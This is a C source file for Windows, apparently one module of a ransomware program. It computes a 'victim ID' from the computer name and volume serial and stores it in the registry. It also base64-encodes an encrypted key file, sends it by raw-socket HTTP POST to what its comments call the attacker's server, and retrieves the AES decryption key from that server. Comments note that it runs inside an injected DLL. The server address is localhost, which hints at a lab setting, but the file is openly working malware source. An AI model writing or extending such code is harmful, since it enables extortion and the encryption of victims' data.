#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "mbedtls/base64.h"

#include "get_relative_path.h"

#define REG_PATH  "Software\\FunEncryptionApp"
#define REG_VALUE "MyID"

/* Generate victim ID using computer name and volume serial number */
#include <windows.h>

WSADATA wsa;
SOCKET sock;
struct sockaddr_in server;

int generate_victim_id(ULONGLONG *out_id)
{
    char comp_name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD name_len = MAX_COMPUTERNAME_LENGTH + 1;
    DWORD serial_num = 0;

    if (!out_id)
        return -1;

    // Get computer name
    if (!GetComputerNameA(comp_name, &name_len))
    {
        strcpy_s(comp_name, sizeof(comp_name), "PC");
        name_len = (DWORD)strlen(comp_name);
    }

    // Get C: drive serial number
    if (!GetVolumeInformationA(
            "C:\\",
            NULL, 0,
            &serial_num,
            NULL, NULL,
            NULL, 0))
    {
        return -1;
    }

    // Simple deterministic mixing
    ULONGLONG id = 0;

    // Mix computer name bytes
    for (DWORD i = 0; i < name_len; i++)
    {
        id ^= (ULONGLONG)(unsigned char)comp_name[i];
        id = (id << 5) | (id >> (64 - 5));  // rotate left
        id *= 1315423911ULL;                // arbitrary prime
    }

    // Mix serial number
    id ^= (ULONGLONG)serial_num;
    id = (id << 13) | (id >> (64 - 13));
    id *= 11400714819323198485ULL;

    *out_id = id;
    return 0;
}


int EnsureIDExists(void)
{
    HKEY hKey;
    DWORD disposition;
    ULONGLONG id;
    DWORD size = sizeof(id);
    DWORD type;

    if (RegCreateKeyExA(
            HKEY_CURRENT_USER,
            REG_PATH,
            0,
            NULL,
            0,
            KEY_READ | KEY_WRITE,
            NULL,
            &hKey,
            &disposition
        ) != ERROR_SUCCESS)
    {
        return 0;
    }

    // Check if value already exists
    if (RegQueryValueExA(
            hKey,
            REG_VALUE,
            NULL,
            &type,
            (BYTE *)&id,
            &size
        ) == ERROR_SUCCESS && type == REG_QWORD)
    {
        RegCloseKey(hKey);
        return 1; // already exists
    }

    // Generate new ID
    if (generate_victim_id(&id) != 0) {
        RegCloseKey(hKey);
        return 0;
    }

    RegSetValueExA(
        hKey,
        REG_VALUE,
        0,
        REG_QWORD,
        (BYTE *)&id,
        sizeof(id)
    );

    RegCloseKey(hKey);
    return 1;
}

int ReadID(ULONGLONG *target)
{
    if (!target) {
        return 1;
    }

    HKEY hKey;
    DWORD size = sizeof(*target);

    if (RegOpenKeyExA(
            HKEY_CURRENT_USER,
            REG_PATH,
            0,
            KEY_READ,
            &hKey
        ) != ERROR_SUCCESS)
    {
        return 1;
    }

    if (RegGetValueA(
            hKey,
            NULL,
            REG_VALUE,
            RRF_RT_REG_QWORD,
            NULL,
            target,
            &size
        ) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);
    return 0;
}

/* Read the encrypted key file */
int read_encrypted_key_file(const char *key_file, 
                                    unsigned char **key_data, 
                                    size_t *key_size) {
    long file_size = 0;

    if (!key_file || !key_data || !key_size) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;
    }
    
    // open file
    FILE *file = fopen(key_file, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return -1;
    }
    
    // get file size
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    
    if (file_size == 0) {
        fclose(file);
        fprintf(stderr, "File is empty\n");
        return -1;
    }
    
    // allocate memory
    unsigned char *file_data = malloc(file_size);
    
    // read file
    fseek(file, 0, SEEK_SET); // go back to beginning as previously the pointer was moved
    if (fread(file_data, 1, file_size, file) != file_size) {
        free(file_data);
        fclose(file);
        fprintf(stderr, "Failed to read file\n");
        return -1;
    }
    
    fclose(file);
    
    // return key and its size
    *key_data = file_data;
    *key_size = file_size;
    
    return 0;
}

/* Convert binary data to base64 as we will send key to the attacker's server in a JSON */
int base64_encode(const unsigned char *bin_input, 
                             size_t bin_input_len,
                             char **base64_output, 
                             size_t *base64_output_len) {
    size_t written = 0;
    
    if (!bin_input || !base64_output || !base64_output_len || bin_input_len == 0) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;  
    }
    
    // calculate buffer size needed - mbedtls call with dst buffer = NULL and its len = 0
    size_t buffer_size = 0;
    mbedtls_base64_encode(NULL, 0, &buffer_size, bin_input, bin_input_len);
    
    // allocate buffer
    unsigned char *buffer = malloc(buffer_size);
    
    // encode to base64 using mbedtls
    if (mbedtls_base64_encode(buffer, buffer_size, &written, bin_input, bin_input_len) != 0) {
        free(buffer);
        fprintf(stderr, "Failed to encode to base64\n");
        return -1;
    }

    buffer[written] = '\0';

    // return string in base64 and its len
    *base64_output = (char *)buffer;
    *base64_output_len = written;
    
    return 0;
}

int ensure_web_setup() {
    // initialize windows sockets
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }
    
    // create tcp socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    
    // setup server address
    server.sin_family = AF_INET;
    server.sin_port = htons(8000);
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // localhost

    return 0;
}

void web_cleanup() {
    closesocket(sock);
    WSACleanup();
}

/* Send victim data to attacker's server */
int send_to_server(ULONGLONG id, const char *encrypted_key) {
    
    // validate inputs
    if (!encrypted_key) {
        return -1;
    }
    
    // Max length of unsigned 64-bit integer is 20 digits
    char id_str[21];
    _ui64toa_s(id, id_str, sizeof(id_str), 10);

    size_t json_size =
        strlen("{\"victim_id\":, \"encrypted_key\":\"\"}") +
        strlen(id_str) +
        strlen(encrypted_key) + 1;

    char *json = malloc(json_size);
    if (!json) {
        return -1;
    }

    snprintf(json, json_size,
             "{\"victim_id\":%s, \"encrypted_key\":\"%s\"}",
             id_str, encrypted_key);

    /* Sending the API request using raw sockets as external libraries were harder
     * to statically link and WinHTTP failed in the injected dll context (error 5023). */
    
    // Setup web environment
    if (ensure_web_setup() != 0) {
        free(json);
        web_cleanup();
        return -1;
    }
    
    // connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        free(json);
        web_cleanup();
        return -1;
    }
    
    // build HTTP POST request manually
    size_t request_size = strlen("POST /api/keys HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/json\r\nContent-Length: ") +
                          strlen(json) + 20 + strlen("\r\n\r\n") + 1;
    char *request = malloc(request_size);
    if (!request) {
        closesocket(sock);
        WSACleanup();
        free(json);
        return -1;
    }
    
    snprintf(request, request_size,
             "POST /api/keys HTTP/1.1\r\n"
             "Host: 127.0.0.1:8000\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s",
             strlen(json), json);
    
    // send HTTP request
    int sent = send(sock, request, strlen(request), 0);
    
    // read response
    char buffer[1024];
    recv(sock, buffer, sizeof(buffer), 0);
    
    // cleanup
    web_cleanup();
    free(request);
    free(json);
    
    // check if send was successful
    if (sent > 0) {
        return 0;  // success
    } else {
        return -1; // failure
    }
}

/* GET /api/decrypt/<id> and save 16-byte AES key to file */
int get_from_server_and_save_key(ULONGLONG id) {

    // Convert id to string
    char id_str[21];
    _ui64toa_s(id, id_str, sizeof(id_str), 10);

    // Setup web environment
    if (ensure_web_setup() != 0) {
        web_cleanup();
        return -1;
    }

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        web_cleanup();
        return -1;
    }

    // Build GET request
    char request[256];
    snprintf(request, sizeof(request),
             "GET /api/key/%s HTTP/1.1\r\n"
             "Host: 127.0.0.1:8000\r\n"
             "\r\n",
             id_str);

    if (send(sock, request, (int)strlen(request), 0) <= 0) {
        web_cleanup();
        return -1;
    }

    // Receive response (small buffer is enough)
    char buffer[256];
    int received = recv(sock, buffer, sizeof(buffer), 0);
    if (received <= 0) {
        web_cleanup();
        return -1;
    }

    // Find start of payload
    char *body = strstr(buffer, "\r\n\r\n");
    if (!body) {
        web_cleanup();
        return -1;
    }
    body += 4; // skip header delimiter

    // Write exactly 16 bytes (AES-128 key) to file
    char aes[MAX_PATH];
    if (get_relative_path(aes, sizeof(aes), "decryption_key.bin") != 0) {
        return 1;
    }
    FILE *fp = fopen(aes, "wb");
    if (!fp) {
        web_cleanup();
        return -1;
    }

    fwrite(body, 1, 16, fp);
    fclose(fp);

    web_cleanup();
    return 0;  // success
}


/* Send encrypted key to attacker's server */
int send_key_to_attacker(const char *key_file) {

    ULONGLONG victim_id;

    // Ensure ID exists (generate if missing)
    if (!EnsureIDExists()) {
        return -1;
    }

    // Read the ID
    if (ReadID(&victim_id) != 0) {
        return -1;
    }

    // read encrypted key from file
    unsigned char *key_data = NULL;
    size_t key_size = 0;
    if (read_encrypted_key_file(key_file, &key_data, &key_size) != 0) {
        return -1;
    }

    // encode key to base64
    char *base64_key = NULL;
    size_t base64_len = 0;
    if (base64_encode(key_data, key_size, &base64_key, &base64_len) != 0) {
        free(key_data); // free key data if encoding fails
        return -1;
    }

    // send to attacker's server
    int result = send_to_server(victim_id, base64_key);

    // cleanup
    free(key_data);
    free(base64_key);

    return result;
}

int get_decryption_key_from_attacker() {
    ULONGLONG victim_id;

    // Ensure ID exists (generate if missing)
    if (!EnsureIDExists()) {
        return -1;
    }

    // Read the ID
    if (ReadID(&victim_id) != 0) {
        return -1;
    }

    if ((get_from_server_and_save_key(victim_id) != 0)) {
        return -1;
    }

    return 0;
}